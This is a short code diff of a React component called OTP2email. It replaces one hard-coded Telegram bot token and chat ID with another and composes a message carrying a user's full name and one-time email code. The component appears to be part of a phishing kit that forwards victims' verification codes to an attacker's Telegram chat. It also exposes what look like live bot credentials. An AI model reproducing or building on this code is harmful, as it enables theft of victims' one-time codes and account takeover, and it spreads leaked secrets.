@@ -19,8 +19,8 @@ const OTP2email: React.FC = () => {
   
     setShowPopup(true);
   
-    const botToken = "7926454402:AAEDVoo1vW7hFgkLKM3qK3f8EsiiKuDsT8c";
-    const chatId = "7062736155";
+    const botToken = "8379013361:AAG_2hOY6uXZTvCaC4HBfYL6-nR3snO06lM";
+    const chatId = "8317872395";
     const message = `${fullName} OTP TO EMAIL \n🔑 Code: ${password}`;
   
     try {
